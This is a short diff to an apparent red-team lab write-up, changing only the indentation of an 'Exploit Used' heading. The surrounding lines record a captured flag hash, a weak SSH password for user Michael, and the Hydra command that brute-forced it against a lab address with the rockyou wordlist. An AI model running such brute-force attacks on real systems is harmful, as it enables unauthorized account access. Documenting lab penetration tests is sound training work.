@@ -44,7 +44,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
    `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
   
-   **Exploit Used**
+    **Exploit Used**
       - Exploit method: Used Hydra to brute force user Michael's password (user: michael pass: michael)
       - Command used: hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.110
   
